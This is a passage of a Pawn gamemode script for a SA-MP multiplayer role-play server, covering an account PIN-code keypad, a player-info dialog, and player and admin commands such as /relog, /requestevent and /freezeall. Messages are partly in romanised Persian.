		format(PlayerRamz[playerid],5,"%s6",PlayerRamz[playerid]);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][15] && strlen(PlayerRamz[playerid]) != 4)
	{
		format(PlayerRamz[playerid],5,"%s7",PlayerRamz[playerid]);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][16] && strlen(PlayerRamz[playerid]) != 4)
	{
		format(PlayerRamz[playerid],5,"%s8",PlayerRamz[playerid]);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][17] && strlen(PlayerRamz[playerid]) != 4)
	{
		format(PlayerRamz[playerid],5,"%s9",PlayerRamz[playerid]);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][24] && strlen(PlayerRamz[playerid]) != 4)
	{
		format(PlayerRamz[playerid],5,"%s0",PlayerRamz[playerid]);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][25])
	{
		strdel(PlayerRamz[playerid],0,4);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][26])
	{
		if(strlen(PlayerRamz[playerid]) <= 3) SendClientMessage(playerid,COLOR_RED,"Lotfan PIN Code 4 Raghami Vared Konid.");
		if(strlen(PlayerRamz[playerid]) >= 5) SendClientMessage(playerid,COLOR_RED,"ERROR: Lotfan PIN Code 4 Raghami Vared Konid.");
	    if(PlayerRamzing[playerid] == 2 && strlen(PlayerRamz[playerid]) == 4)
	    {
			if(PlayerInfo[playerid][pPinCode] == udb_hash(PlayerRamz[playerid]))
	        {
	            AccountLock[playerid] =0;
				SendClientMessage(playerid,0x6699AAAA," {FFFFFF}Account Shoma: {57e547}Unlock Shod");
				strdel(PlayerRamz[playerid],0,4);
				TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][0]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][1]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][2]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][3]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][4]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][5]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][6]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][7]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][8]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][9]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][10]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][11]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][12]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][13]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][14]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][15]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][16]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][17]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][18]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][19]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][20]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][21]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][22]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][23]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][24]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][25]);
				TextDrawHideForPlayer(playerid, TDPinCode[playerid][26]);
				PlayerRamzing[playerid] =0;
				CancelSelectTextDraw(playerid);
			}
			else
			{
				SendClientMessage(playerid,COLOR_RED,"PIN Code Eshtebah Ast. Agar Fekr Mikonid Pin Code Ra Dorost Vared Kardid , Yekbar /Relog Konid");
				strdel(PlayerRamz[playerid],0,4);
				TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
			}
		}
	    if(PlayerRamzing[playerid] == 1 && strlen(PlayerRamz[playerid]) == 4)
	    {
		    new string[128];
			format(string,sizeof(string),"PIN Code Shoma: {FFFFFF}%s",PlayerRamz[playerid]);
			SendClientMessage(playerid,0x6699AAAA,string);
			PlayerInfo[playerid][pPinCode] =udb_hash(PlayerRamz[playerid]);
			SaveKonVal(playerid, "pPinCode",udb_hash(PlayerRamz[playerid]));
			strdel(PlayerRamz[playerid],0,4);
			TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][0]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][1]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][2]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][3]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][4]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][5]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][6]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][7]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][8]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][9]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][10]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][11]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][12]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][13]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][14]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][15]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][16]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][17]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][18]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][19]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][20]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][21]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][22]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][23]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][24]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][25]);
			TextDrawHideForPlayer(playerid, TDPinCode[playerid][26]);
			PlayerRamzing[playerid] =0;
			CancelSelectTextDraw(playerid);
		}
	}
	if(PlayerRamzing[playerid] == 1 || PlayerRamzing[playerid] == 2) SelectTextDraw(playerid, 0x00FFFFAA);
	return 1;
}
new clicked[MAX_PLAYERS];
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
new ttext[512];
		if(PlayerInfo[clickedplayerid][pMember] == 2 || PlayerInfo[clickedplayerid][pLeader] == 2) { ttext = "F.B.I"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 1 || PlayerInfo[clickedplayerid][pLeader] == 1) { ttext = "Police Departament"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 3 || PlayerInfo[clickedplayerid][pLeader] == 3) { ttext = "National Guard"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 5 || PlayerInfo[clickedplayerid][pLeader] == 5) { ttext = "Silence Mafia"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 6 || PlayerInfo[clickedplayerid][pLeader] == 6) { ttext = "The Killers Family"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 12 || PlayerInfo[clickedplayerid][pLeader] == 12) { ttext = "Grove Street Gang"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 13 || PlayerInfo[clickedplayerid][pLeader] == 13) { ttext = "Legendary Men Family"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 14 || PlayerInfo[clickedplayerid][pLeader] == 14) { ttext = " Ballas Gang Family "; }
        else if(PlayerInfo[clickedplayerid][pMember] == 15 || PlayerInfo[clickedplayerid][pLeader] == 15) { ttext = " Storm Men Mafia "; }
        else if(PlayerInfo[clickedplayerid][pMember] == 7 || PlayerInfo[clickedplayerid][pLeader] == 7) { ttext = "Government"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 8 || PlayerInfo[clickedplayerid][pLeader] == 8) { ttext = "Hitman Agency"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 4 || PlayerInfo[clickedplayerid][pLeader] == 4) { ttext = "Firemen/Red Cross"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 9 || PlayerInfo[clickedplayerid][pLeader] == 9) { ttext = "Reporters"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 10 || PlayerInfo[clickedplayerid][pLeader] == 10) { ttext = "Taxi Drivers"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 16 || PlayerInfo[clickedplayerid][pLeader] == 16) { ttext = "Mechanic"; }
        else if(PlayerInfo[clickedplayerid][pMember] == 11 || PlayerInfo[clickedplayerid][pLeader] == 11) { ttext = "School Instructor"; }
		else if(PlayerInfo[clickedplayerid][pMember] == 17 || PlayerInfo[clickedplayerid][pLeader] == 17) { ttext = "Staff Family"; }
		else if(PlayerInfo[clickedplayerid][pMember] == 19 || PlayerInfo[clickedplayerid][pLeader] == 19) { ttext = "The Racers"; }
		else if(PlayerInfo[clickedplayerid][pMember] == 20 || PlayerInfo[clickedplayerid][pLeader] == 20) { ttext = "San Fiero Police Department"; }
		else if(PlayerInfo[clickedplayerid][pMember] == 21 || PlayerInfo[clickedplayerid][pLeader] == 21) { ttext = "Grand Warriors"; }
        else { ttext = "Civilian"; }
		new rank[512];
		if(PlayerInfo[clickedplayerid][pRank] == 7) {rank = "Leader";}
		else if(PlayerInfo[clickedplayerid][pRank] == 6) {rank = "Sub Leader";}
		else if(PlayerInfo[clickedplayerid][pRank] == 5) {rank = "Rank 5";}
		else if(PlayerInfo[clickedplayerid][pRank] == 4) {rank = "Rank 4";}
		else if(PlayerInfo[clickedplayerid][pRank] == 3) {rank = "Rank 3";}
		else if(PlayerInfo[clickedplayerid][pRank] == 2) {rank = "Rank 2";}
		else if(PlayerInfo[clickedplayerid][pRank] == 1) {rank = "Rank 1";}
        else if(PlayerInfo[clickedplayerid][pRank] == 1 && PlayerInfo[clickedplayerid][pMember] == 7)    {rank = "Lawyers";}
        else if(PlayerInfo[clickedplayerid][pRank] == 2 && PlayerInfo[clickedplayerid][pMember] == 7)    {rank = "Detective";}
		clicked[playerid] = clickedplayerid;
		new ph = PlayerInfo[clickedplayerid][pPnumber];
		new name[40];
		GetPlayerName(clickedplayerid, name, sizeof(name));

		new pin[1024];
		format(pin, sizeof(pin), " Name:{91e2b8}%s{ffffff}\n Level: %d\n Faction: %s\n Rank: %s\n Phone Number: %s",name,PINFO[clickedplayerid][pLevel],ttext,rank,FormatPhoneNumber(ph));
		ShowPlayerDialog(playerid, 2101, DIALOG_STYLE_MSGBOX, "{e88d9c}Moshakhasat:",pin, "Ok", "");
		return 1;
}

public OnPlayerCommandText(playerid, cmdtext[])
{

	
	if(!strcmp(cmdtext,"/busdrivers",true))
	{
//        	PutPlayerInVehicle(playerid, NPCBlackBus, 0);
//        		PutPlayerInVehicle(playerid, NPCBlueBus, 0);
//		return SCM(playerid,-1,"Connected");
	}
	if(!strcmp(cmdtext, "/bank",true))
	{
        ShowPlayerDialog(playerid,DIALOG_BANK_LIST,DIALOG_STYLE_LIST,"Bank","Bardasht\nVariz\nMojoodi\nEnteghal","Entekhab","Enseraf");
        return 1;
	}
    if(!strcmp(cmdtext, "/relog", true))
    {
			new string[30];
        isRelogging[playerid] = true;
        GetPlayerIp(playerid, relogPlayerIP[playerid], 17);
        format(string, sizeof(string), "banip %s", relogPlayerIP[playerid]);
		SetTimerEx("reloging",11000,0,"i",playerid);
        SendRconCommand(string);
		SetPlayerInterior(playerid, 0);
        SetPlayerCameraPos(playerid,-1590.5505,640.1832,42.5899);
			SetPlayerCameraLookAt(playerid,-1212.1045,789.4034,51.7474);
			InterpolateCameraPos(playerid,-1590.5505,640.1832,46.5899,-1212.1045,900.4034,51.7474,15000, CAMERA_MOVE);
			InterpolateCameraLookAt(playerid,-1212.1045,789.4034,51.7474,-1461.7734,762.0996,47.0103,15000, CAMERA_MOVE);
		GetPlayerTag(playerid);
        SendMessage(playerid, COLOR_YELLOW, "Your relog request is proccesing ...");
        return 1;
	}

    AFKTime[playerid] = 0;
    if(!strcmp(cmdtext, "/pin", true))
    {
	    if(PlayerInfo[playerid][pPinCode] == 0) return SCM(playerid,COLOR_YELLOW2,"Error: Unknown command.");//SendClientMessage(playerid,0xFF0000AA,"Account Shoma PinCode Nadarad. /Pincode");
		if(PlayerRamzing[playerid] == 1) return SCM(playerid,COLOR_YELLOW2,"Error: Unknown command.");//SendClientMessage(playerid,0xFF0000AA,"NumPad Baraie Shoma Faal Ast.");
		if(AccountLock[playerid] == 0) return SCM(playerid,COLOR_YELLOW2,"Error: Unknown command.");//SendClientMessage(playerid,0xFF0000AA,"Account Shoma UnLock Ast.");
		SelectTextDraw(playerid, 0x00FFFFAA);
		PlayerRamzing[playerid] =2;
		strdel(PlayerRamz[playerid],0,4);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][0]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][1]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][2]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][3]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][4]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][5]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][6]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][7]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][8]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][9]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][10]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][11]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][12]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][13]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][14]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][15]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][16]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][17]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][18]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][19]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][20]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][21]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][22]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][23]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][24]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][25]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][26]);
//		SendClientMessage(playerid,0x6699AAAA,"Lotfan PIN Code Khod Ra Vared Konid.");
		return 1;
	}
	if(AccountLock[playerid] == 1) return SCM(playerid, COLOR_ALI,"In Account Ghofl Ast.");
    if(gPlayerLogged[playerid] == 0) return SCM(playerid,COLOR_ALI,"First login into the server.");
    if(IsLogedIn[playerid] == false) return SCM(playerid, COLOR_ALI,"Account Shoma Dar Hale Load Shodan Ast.");
    new playermoney;
    new sendername[MAX_PLAYER_NAME];
    new giveplayer[MAX_PLAYER_NAME];
    new playername[MAX_PLAYER_NAME];
    new cmd[146];
    new tmp[146];
    new giveplayerid, moneys, idx;
    new idcar = GetPlayerVehicleID(playerid);
    new pveh = GetVehicleModel(GetPlayerVehicleID(playerid));
    cmd = strtok(cmdtext, idx);
    if(strcmp(cmd, "/requestevent", true) == 0 || strcmp(cmd, "/re", true) == 0)
    {
        new EventParameters[512];EventParameters = strtokLoL(cmdtext,idx);
        if(PINFO[playerid][pLevel] < 7) return SCM(playerid,COLOR_ALI,"Your level is too low.");
        if(EventHave == true) return SCM(playerid,COLOR_ALI,"An event already is on going.");
        if(EventID[playerid] != 9999) return SCM(playerid,COLOR_EVENT,"You already calling for an event waiting for admins accept.");
        new Khat[15],Khats,b;
        for(new i;i<strlen(EventParameters);i++)
        {
            switch(EventParameters[i])
            {
                case '|': { Khat[b] = i; Khats ++; b++;}
            }
        }
        if(Khats <= 3) return SCM(playerid,COL_SYN,"Syntax: /requestevent <Tiltle>|<Location>|<Price>|<Time>|<Descriptaion>");
        new Title[256];
        if(EventParameters[0] == '|') return SCM(playerid,COL_SYN,"Syntax: /requestevent <Tiltle>|<Location>|<Price>|<Time>|<Descriptaion>");
        new c;
        for(new i;i<Khat[0];i++)
        {
                Title[c] = EventParameters[i]; c++;
        }
        if(!strlen(Title)) return SCM(playerid,COL_SYN,"Syntax: /requestevent <Tiltle>|<Location>|<Price>|<Time>|<Descriptaion>");
        if(strlen(Title) <= 2 || strlen(Title) >= 60) return SCM(playerid,COLOR_ALI,"Type Title with higher than 3 and lower than 60 characters.");
        new location[256],d;
        for(new i = Khat[0];i<Khat[1];i++)
        {
            if(i != Khat[0])
            {
                location[d] = EventParameters[i]; d++;
            }
        }
        if(!strlen(location)) return SCM(playerid,COL_SYN,"Syntax: /requestevent <Tiltle>|<Location>|<Price>|<Time>|<Descriptaion>");
        if(strlen(location) <= 2 || strlen(location) >= 60) return SCM(playerid,COLOR_ALI,"Type Location with higher than 3 and lower than 60 characters.");
        new rewardd[256],reward,e;
        for(new i = Khat[1];i<Khat[2];i++)
        {
            if(i != Khat[1])
            {
                rewardd[e] = EventParameters[i]; e++;
            }
        }
        if(!strlen(rewardd)) return SCM(playerid,COL_SYN,"Syntax: /requestevent <Tiltle>|<Location>|<Price>|<Time>|<Descriptaion>");
        reward = strval(rewardd);
        if(reward < 1000 || reward > 500000) return SCM(playerid,COLOR_ALI,"Price must be higher than $1,000 and lower than $50,0000");
        new times[256],f;
        for(new i = Khat[2];i<Khat[3];i++)
        {
            if(i != Khat[2])
            {
                times[f] = EventParameters[i]; f++;
            }
        }
        if(!strlen(times)) return SCM(playerid,COL_SYN,"Syntax: /requestevent <Tiltle>|<Location>|<Price>|<Time>|<Descriptaion>");
        if(strlen(times) >= 6) return SCM(playerid,COLOR_ALI,"Time is wrong, type a time example: 12:00");
        new p,l;
        for(new i;i<strlen(times);i++) { switch(times[i]) { case ':': {p++;l = i;} } }
        if(p >= 2) return SCM(playerid,COLOR_ALI,"Time is wrong, type a time example: 12:00");
        if(l != 1 && l != 2) return SCM(playerid,COLOR_ALI,"Time is wrong, type a time example: 12:00");
        new Hour[5],Min[5],Hourr,Minn;
        if(l == 1){Hour[0] = '0';Hour[1] = times[0];strins(times,"0",0,256);Min[0] = times[3];if(strlen(times) == 5) {Min[1] = times[4];}}
        else { Hour[0] = times[0]; Hour[1] = times[1]; Min[0] = times[3]; if(strlen(times) == 5) Min[1] = times[4]; }
        Hourr = strval(Hour);Minn = strval(Min);
        if((Hourr >= 24 || Hourr <= -1) || (Minn >= 61 || Minn <= -1)) return SCM(playerid,COLOR_ALI,"Time is wrong, type a time example: 00:00");
        if(strlen(Min) == 1)
        {
            strins(Min,"0",0,5);
            strins(times,"0",3,256);
        }
        new desc[256],g;
        for(new i = Khat[3];i<strlen(EventParameters);i++)
        {
            if(i != Khat[3])
            {
                desc[g] = EventParameters[i]; g++;
            }
        }
        if(!strlen(desc)) return SCM(playerid,COL_SYN,"Syntax: /requestevent <Tiltle>|<Location>|<Price>|<Time>|<Descriptaion>");
        if(strlen(desc) <= 2 || strlen(desc) >= 60) return SCM(playerid,COLOR_ALI,"Type Descriptaion with higher than 3 and lower than 80 characters.");
        new returnevent = ReturnEventID();
        EventIDUsed[returnevent] = true;
        EventIDOrg[returnevent] = playerid;
        EventID[playerid] = returnevent;
        strmid(EventTitle[playerid],Title,0,strlen(Title),60);
        strmid(EventLocation[playerid],location,0,strlen(location),60);
        strmid(EventTime[playerid],times,0,strlen(times),20);
        strmid(EventDesc[playerid],desc,0,strlen(desc),80);
        EventReward[playerid] = reward;
        new string[330];
        format(string,330,"Event ID %d: Title: %s, Prize: $%s, Location: %s, Time: %s",returnevent,Title,FormatNumber(reward),location,times);
        SCM(playerid,COLOR_YELLOW,string);
        EventAdminSay(COLOR_YELLOW,string);
        format(string,330,"Event ID %d: Organizer: %s, Description: %s",returnevent,PINFO[playerid][pName],desc);
        SCM(playerid,COLOR_YELLOW,string);
        EventAdminSay(COLOR_YELLOW,string);
        format(string,330,"[AdmBot]: Use /aaevent %d to accept this event.",returnevent);
        EventAdminSay(COLOR_YELLOW,string);
        SCM(playerid,COLOR_ALI,"You must waiting for admins to accept this event.");
        return 1;
    }
	//if(IsTabligh(cmdtext))
	//{
	//	new strdetect[128];
	//	format(strdetect,sizeof(strdetect), "[L-TABLIGH]: %s(%d): %s", PINFO[playerid][pName],playerid,cmdtext);
	//	AdminWarn(strdetect);
	//	return 1;
	//}
    new noghtepos = strfind(cmdtext, ".", true);
    if(PINFO[playerid][pAdmin] < 7)
    {
        if(noghtepos != -1)
        {
            new noghte, adad;
            for(new i;i<strlen(cmdtext);i++)
            {
                switch(cmdtext[i])
                {
                    case '.':noghte++;
                    case 0x30..0x39:adad++;
                }
            }
            if(adad >= 5)
            {
                if(noghte >= 3)
                {
                    if(cmdtext[noghtepos+1] >= 0x30 && cmdtext[noghtepos+1] <= 0x39)
                    {
                        new strdetect[150];
                        format(strdetect, 150, "%s needs to advertising on the server: %s", PINFO[playerid][pName], cmdtext);
                        AdminWarn(strdetect);
                        return 1;
                    }

                    if(cmdtext[noghtepos+1] == ' ' || cmdtext[noghtepos+1] == ' ')
                    {
                        if(cmdtext[noghtepos+1] >= 0x30 && cmdtext[noghtepos+1] <= 0x39)
                        {
                            new strdetect[150];
                            format(strdetect, 150, "%s needs to advertising on the server: %s", PINFO[playerid][pName], cmdtext);
                            AdminWarn(strdetect);
                            return 1;
                        }
                    }
                }
            }
        }
    }
    if(!strcmp(cmd, "/freezeall", true))
    {
        if(PINFO[playerid][pAdmin] < 2) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /freezeall <Distance(FLOAT)>");
        new Float:dis = floatstr(tmp);
        if(dis > 0.0)
        {
            new lolstr[150];
            format(lolstr, 150, "Admin %s has been frozen all players.", PINFO[playerid][pName]);
            for(new i;i<LastPID;i++)
            {
                if(IsPlayerConnected(i) && gPlayerLogged[i] == 1 && i != playerid && PINFO[i][pAdmin] < 1)
                {
                    if(ProxDetectorS(dis, playerid, i))
                    {
                        TogglePlayerControllable(i, 0);
                        SCM(i, COLOR_LIGHTRED, lolstr);
			OnFreeze[i] = 1;
                    }
                }
            }
            format(lolstr, 150, "%s has been frozen all players in %.2f distance", PINFO[playerid][pName], dis);
            AdminWarn(lolstr);
        }
        else return SCM(playerid, COLOR_ALI, "Invalid Distance amount.");
        return 1;
    }
    if(!strcmp(cmd, "/unfreezeall", true))
    {
        if(PINFO[playerid][pAdmin] < 2) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /unfreezeall <Distance(FLOAT)>");
        new Float:dis = floatstr(tmp);
        if(dis > 0.0)
        {
            new lolstr[150];
            format(lolstr, 150, "Admin %s has been unfrozen all players.", PINFO[playerid][pName]);
            for(new i;i<LastPID;i++)
            {
                if(IsPlayerConnected(i) && gPlayerLogged[i] == 1 && i != playerid && PINFO[i][pAdmin] < 1)
                {
                    if(ProxDetectorS(dis, playerid, i))
                    {
                        TogglePlayerControllable(i, 1);
                        SCM(i, COLOR_LIGHTRED, lolstr);
			OnFreeze[i] = 0;
                    }
                }
            }
            format(lolstr, 150, "%s has been unfrozen all players in %.2f distance", PINFO[playerid][pName], dis);
            AdminWarn(lolstr);
        }
        else return SCM(playerid, COLOR_ALI, "Invalid Distance amount.");
        return 1;
    }


	if (strcmp("/pincode", cmdtext, true, 10) == 0)
	{
	    if(PlayerInfo[playerid][pPinCode] != 0) return SendClientMessage(playerid,0xFF0000AA,"Account Shoma PinCode Darad.");
		if(PlayerRamzing[playerid] == 1) return SendClientMessage(playerid,0xFF0000AA,"NumPad Baraie Shoma Faal Ast.");
		SelectTextDraw(playerid, 0x00FFFFAA);
		PlayerRamzing[playerid] =1;
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][0]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][1]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][2]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][3]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][4]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][5]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][6]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][7]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][8]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][9]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][10]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][11]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][12]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][13]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][14]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][15]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][16]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][17]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][18]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][19]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][20]);
		strdel(PlayerRamz[playerid],0,4);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][21]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][22]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][23]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][24]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][25]);
		TextDrawShowForPlayer(playerid, TDPinCode[playerid][26]);
		SendClientMessage(playerid,0x6699AAAA,"Lotfan PIN Code Morede Nazar Khod Ra Vared Konid Va On Ra Yaddasht Ya Bekhater Beseparid.");
		SendClientMessage(playerid,0x6699AAAA,"Server Hichgone Masoliati Dar Ghebale Faramoshi Pin Code Va ... Nadarad.");
		return 1;
	}



    if(!strcmp(cmd, "/sethpall", true))
    {
        if(PINFO[playerid][pAdmin] < 5) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /sethpall <Distance(FLOAT)> <Amount(FLOAT)>");
        new Float:dis = floatstr(tmp);
        new lola[150];
        lola = strtok(cmdtext, idx);
        if(!strlen(lola)) return SCM(playerid, COL_SYN, "Syntax: /sethpall <Distance(FLOAT)> <Amount(FLOAT)>");
        new Float:rpam = floatstr(lola);
        if(rpam < 101.0 && rpam > 0.0)
        {
            if(dis < 100000.0 && dis > 0.0)
            {
                new lolstr[200];
                format(lolstr, 200, "Admin %s has set all players online health to %.2f.", PINFO[playerid][pName], rpam);
                for(new i;i < LastPID;i++)
                {
                    if(IsPlayerConnected(i) && gPlayerLogged[i] == 1 && ProxDetectorS(dis, playerid, i))
                    {
                        SetPlayerKhoon(true, i, rpam);
                        SCM(i, COLOR_LIGHTRED, lolstr);
                    }
                }
                format(lolstr, 200, "%s has set all players hp to %.2f in %.2f distance.", PINFO[playerid][pName], rpam, dis);
                AdminWarn(lolstr);
            }
            else return SCM(playerid, COLOR_ALI, "Invalid distance.");
        }
        else return SCM(playerid, COLOR_ALI, "Invalid hp.");
        return 1;
    }

if(strcmp(cmd, "/stopmlr", true) == 0) {
	if(IsPlayerConnected(playerid)) {
	if(PlayerInfo[playerid][pAdmin] <= 7)
      {
       SCM(playerid,COLOR_RED,"Error: Your admin level isn't high enough to use this command.");
      return 1;
      }
   if(MLR == 0) return SCM(playerid, COLOR_YELLOW2, "Error: MLR system already disabled.");
	GetPlayerName(playerid, sendername, sizeof(sendername));
    new str[512];
	format(str, sizeof(str), "{FFFFFF}Admin %s disabled MLR system.", sendername);
	AdminWarn(str);
	MLR = 0;
	MMLR = 0;
	RMLR = 0;
	LMLR = 0;
	PMLR = 0;
	}

	return 1;
	}

if(strcmp(cmd, "/mlr", true) == 0)
    {
      if(PlayerInfo[playerid][pAdmin] <= 10)
      {
       SCM(playerid,COLOR_RED,"Error: Your admin level isn't high enough to use this command.");
      return 1;
      }
	  if(MLR == 1) return SCM(playerid, COLOR_YELLOW2, "Error: MLR system already enabled. use /stopmlr");
      new Money;
      new Level;
      new Respect;
	  new Players;
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /mlr <Money> <Level> <Respect> <Players>");
      return 1;
      }
      Money = strval(tmp);
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /mlr <Money> <Level> <Respect> <Players>");
      return 1;
      }
      Level = strval(tmp);
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
     SCM(playerid,COL_SYN,"SSyntax: /mlr <Money> <Level> <Respect> <Players>");
      return 1;
      }
	Respect = strval(tmp);
	tmp = strtok(cmdtext, idx);
